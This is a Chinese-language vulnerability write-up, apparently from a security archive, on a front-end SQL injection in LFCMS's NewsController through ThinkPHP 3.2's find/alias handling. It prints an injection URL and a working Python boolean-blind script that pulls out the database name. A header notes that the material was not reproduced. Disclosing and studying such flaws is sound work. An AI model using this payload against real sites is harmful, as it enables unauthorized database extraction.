---
source: "hatch 补库批 20260928"
product: "LFCMS / ThinkPHP3.2"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "LFCMS NewsController.class.php 前台sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：News.index接受id数组，已存在id1文章及可见布尔响应"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-c91ec5e200bc88008a341c1e"
entity_id: "ve-c91ec5e200bc88008a341c1e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：News.index接受id数组，已存在id1文章及可见布尔响应

- **事实待核（1）**：具体CMS和TP补丁版本缺；继承框架find alias原语应关联框架。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：脚本固定tttest匹配属于实验文章内容，不能作为通用判据；URL--尾空白/编码需明确。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **代码与转录边界（3）**：另Movie.index只类比未独立验证；与249同文但249缩进和图片损坏。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# LFCMS NewsController.class.php 前台sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

回到lfcms，漏洞起始点位于`/Application/Home/Controller/NewsController.class.php`中的`index`方法，代码如下

![1.png](./.resource/LFCMSNewsController.class.php前台sql注入漏洞/media/rId24.png)

在代码第六行调用了`News`模型中的`detail`方法，跟进该方法

![2.png](./.resource/LFCMSNewsController.class.php前台sql注入漏洞/media/rId25.png)

可以看到在第八行进而调用了`tp`的`find`方法，在该版本中`find`方法是可以进行注入的，同时参数`$id`是我们可控的，首先我们来看一下正常的输入情况(图中域名为本地搭建解析)

![3.png](./.resource/LFCMSNewsController.class.php前台sql注入漏洞/media/rId26.png)

根据`tp3.2`的注入点构造一下语句，访问如下链接

    http://www.0-sec.org/index.php/Home/News/index/?id[alias]=where id=1 and 1--

页面与正常访问相比没有变化，查看一下数据库日志，看下后端数据库语句![4.png](./.resource/LFCMSNewsController.class.php前台sql注入漏洞/media/rId27.png)

可以看到在`id`处已经可以进行`sql`语句的拼接，也就证明该处是存在可利用的注入点的，由于本套程序对于错误信息是有屏蔽的，在这里我们很难利用报错注入带出数据，在该处可以考虑使用布尔类型的盲注，两种回显状态如下

![5.png](./.resource/LFCMSNewsController.class.php前台sql注入漏洞/media/rId28.png)

![6.png](./.resource/LFCMSNewsController.class.php前台sql注入漏洞/media/rId29.png)

接着写一下脚本（以查询数据库名为例）

    import requests
    url = 'http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and '
    result = ''
    for i in range(1,50):
        print('-----------------------------')
        for j in range(32,127):
            payload = 'if((ascii(substr((select database()),{},1))={}),1,0)--'.format(i,j)
            temp = url+payload
            try:
                html = requests.get(temp,timeout=10)
                if 'tttest' in html.text:
                    result+=chr(j)
                    print(result)
                    break
            except:
                print('[-]error')

结果如下

![7.png](./.resource/LFCMSNewsController.class.php前台sql注入漏洞/media/rId30.png)

相同原理的利用点还有很多，如位于`/Application/Home/Controller/MovieController.class.php`中的`index`方法的`id`参数，这里就不再重复分析了

参考链接
--------

> https://xz.aliyun.com/t/7844
